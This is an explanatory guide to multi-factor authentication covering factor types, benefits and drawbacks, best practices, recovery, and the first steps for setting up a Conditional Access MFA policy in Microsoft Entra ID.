________________________________________
Can MFA be Enabled or Disabled for Many Users at Once?
Yes! Administrators can enable or disable MFA in bulk for multiple users, making management easier.


What is Multi-Factor Authentication (MFA)?
MFA is a security method that makes users prove their identity in more than one way before they can access an account or system. This is much safer than just using a password (which is called single-factor authentication).
________________________________________
Key Points about MFA:
•	MFA vs. 2FA:
o	MFA (Multi-Factor Authentication) means using two or more different types of verification.
o	2FA (Two-Factor Authentication) is a specific type of MFA that uses exactly two factors.
•	Types of factors:
To make MFA strong, the verification methods should be different types of factors, such as:
1.	Something you know: Passwords, PINs, or answers to security questions.
2.	Something you have: Physical tokens, apps generating codes, certificates, SMS codes, phone calls.
3.	Something you are: Biometrics like fingerprints, facial scans, or iris scans.
4.	Location: Based on IP address or physical location.
•	Why use MFA?
Even if some MFA methods aren’t perfect, any MFA is better than just a password because it makes unauthorized access much harder.
________________________________________
Benefits of MFA:
•	Stops common attacks like guessing passwords or using stolen credentials.
•	Greatly lowers the chance of an account being hacked because multiple proofs are needed.
________________________________________
Downsides of MFA:
•	Can be harder to set up and manage for both users and admins.
•	Sometimes costs extra, especially if hardware tokens are required.
•	Users may get locked out if they lose their MFA device or method.
•	Adding MFA can introduce technical challenges or new security risks if not done carefully.
•	Some weak implementations can be bypassed by attackers.
•	Might exclude some users who can’t use MFA easily.
________________________________________
MFA Best Practices (Quick Recommendations):
•	Let users opt-in to MFA using apps that generate temporary codes (like Google Authenticator).
•	Make MFA mandatory for high-risk or admin users.
•	Consider exemptions for trusted corporate networks to reduce hassle.
•	Allow users to save their MFA status on trusted browsers to avoid constant prompts.
•	Have a secure and clear process to reset MFA if users lose access.

When to Require MFA:
Always require MFA when logging in. Also require MFA for important actions like:
•	Changing passwords
•	Changing security questions
•	Updating email addresses
•	Turning off MFA
•	Increasing user permissions
Make sure MFA is enforced everywhere — on websites, APIs, and mobile apps.
________________________________________
Making MFA User-Friendly:
•	Remember users’ sessions in browsers securely to reduce repeated MFA challenges.
•	Consider skipping MFA on trusted corporate IPs—but be cautious of insider threats.
•	Use MFA mainly for sensitive actions rather than every login to reduce annoyance.
________________________________________
Handling MFA Failures:
If MFA fails (maybe the user lost their second factor), do this:
•	Provide alternative MFA options (like SMS codes).
•	Let users reset their MFA safely.
•	Notify users if there was a suspicious failed login attempt, including details like time and location, and suggest changing passwords.
________________________________________
Resetting MFA:
Resetting MFA is tricky because you want to keep accounts safe while helping users regain access.
•	Users might lose MFA devices due to phone loss or upgrades.
•	Recovery should avoid letting attackers hijack accounts.
•	Common recovery methods include backup codes, multiple MFA methods, support help, or trusted contacts.
•	Choose the best recovery method based on your app’s security needs.
________________________________________
Implementing MFA in Microsoft Entra ID (Azure AD):
•	MFA adds extra security by asking users for additional identification during sign-in.
•	Requirements: Microsoft Entra ID P1 or P2 license.
•	Roles needed to manage MFA: Global Admin, Security Admin, Conditional Access Admin, or Authentication Policy Admin (for some settings).
•	Microsoft recommends enabling MFA through Conditional Access policies for better control.
How to create a Conditional Access MFA policy:
1.	Sign in to Microsoft Entra Admin Center.
2.	Go to Protection > Conditional Access > New policy.
3.	Name the policy (e.g., "MFA_policy").
4.	Assign it to specific users or groups who need MFA.




